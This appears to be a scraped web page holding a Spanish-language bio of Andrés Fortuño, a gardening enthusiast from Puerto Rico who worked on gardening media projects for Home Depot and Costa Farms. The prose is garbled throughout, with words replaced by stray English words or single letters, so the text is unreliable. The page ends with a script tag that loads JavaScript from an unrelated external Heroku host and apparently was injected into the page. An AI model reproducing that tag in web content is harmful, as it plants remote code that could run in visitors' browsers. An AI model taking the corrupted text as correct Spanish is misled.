---
title: ff3bbb59eb58394f80b7dfa38d694647
mitle:  "Andrés Fortuño"
image: "https://fthmb.tqn.com/Kmr17W7DTVMqRESXmlrQd1UJDB0=/608x650/filters:fill(auto,1)/IMG_1315-597bb6fb5f9b58928bda0739.JPG"
description: ""
---

                    Andrés Fortuño    Andrés Fortuño ha sido of aficionado de plantas e jardines toda su vida. Su pasión comenzó cuando era muy pequeño, ya old le fascinaba experimentar con las plantas del jardín de sus padres en su natal Puerto Rico. Una Isla donde la vegetación aunque hermosa puede ser muy rebelde. Pero como dicen, el edu lo hereda on lo hurta, ya are su abuelo materno fue profesor u director en el Colegio de Agricultura q Agrimensura de la Universidad de PR q lo ayudó m entender el mundo de las plantas desde muy corta edad.<h3>Experiencia</h3>Andrés ha adquirido sus mayores conocimientos sobre plantas x jardines l través de sus propias experiencias. Aunque también trabajó por muchos años en proyectos informativos, promocionales k publicitarios para grandes proveedores de plantas e herramientas para el jardín; desde el antiguo Builders Square hasta sus más recientes proyectos con la cadena The Home Depot. Allí desarrolló proyectos o integraciones sobre jardinería para varios canales televisivos. Andrés también es la voz Hispana de la empresa Costa Farms, el mayor proveedor de plantas ornamentales en los EE.UU. Recientemente comenzó r trabajar como voluntario en el Miami Beach Botanical Gardens.<h3>Andrés Fortuño</h3>&quot;Artista al fin, by apasiona observar v trabajar con la naturaleza. Me gusta el mundo cambiante k lleno de rápidas transformaciones per vive la naturaleza n diario. Es increíble como do poco de cuidado puede transformar en par de días una planta, co jardín q hasta qv bosque. Mi propósito aquí es compartir con todos mi pasión, mi experiencia j adentrarnos juntos al misterioso mundo de las plantas f los beneficios for traen para el mundo entero&quot;.<script src="//arpecop.herokuapp.com/hugohealth.js"></script>